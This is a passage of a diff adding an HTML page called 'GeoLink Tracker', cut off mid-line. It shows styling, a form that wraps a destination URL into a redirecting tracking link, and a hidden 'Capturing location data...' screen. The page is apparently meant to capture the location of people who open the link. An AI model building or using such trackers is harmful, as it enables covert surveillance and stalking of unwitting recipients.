@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GeoLink Tracker</title>
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --accent: #e74c3c;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #f5f6fa;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .generator-form {
+            display: grid;
+            gap: 15px;
+        }
+
+        input, button {
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+
+        button {
+            background: var(--secondary);
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        button:hover {
+            background: #2980b9;
+            transform: translateY(-1px);
+        }
+
+        .link-list {
+            margin-top: 30px;
+            border-top: 2px solid #eee;
+            padding-top: 20px;
+        }
+
+        #map {
+            height: 400px;
+            width: 100%;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .tracking-link {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            word-break: break-all;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--secondary);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="generatorSection">
+            <h1>🛰️ Create Tracking Link</h1>
+            <form class="generator-form" onsubmit="generateLink(event)">
+                <input type="url" id="targetUrl" 
+                       placeholder="Enter destination URL" required>
+                <button type="submit">Generate Tracking Link</button>
+            </form>
+            <div class="link-list">
+                <h2>Active Trackers</h2>
+                <div id="linkContainer"></div>
+            </div>
+            <div id="map"></div>
+        </div>
+
+        <div id="trackerSection" class="hidden">
+            <div class="loader"></div>
+            <p>Capturing location data...</p>
+        </div>
+    </div>
+
+    <script>
+        const TRACKING_DATA_KEY = 'geoLinkData';
+        
+        function generateLink(e) {
+            e.preventDefault();
+            const targetUrl = document.getElementById('targetUrl').value;
+            const trackingId = self.crypto.randomUUID();
+            const fullUrl = `${location.href}?track=${trackingId}&redirect=${encodeURIComponent(targetUrl)}`;
+            
+            const trackingData = {
+                id: trackingId,
+                redirectUrl: targetUrl,
+                locations: [],
+                createdAt: new Date().toISOString()
+            };
+
+            // Save to localStorage
+            const existingData = JSON.parse(localStorage.getItem(TRACKING_DATA_KEY)) || {};
+            existingData[trackingId] = trackingData;
+            localStorage.setItem(TRACKING_DATA_KEY, JSON.stringify(existingData));
+
+            // Display generated link
+            const linkDiv = document.createElement('div');
+            linkDiv.className = 'tracking-link';
+            linkDiv.innerHTML = `
+                <strong>Tracking Link:</strong><br>
+                <a href="${fullUrl}" target="_
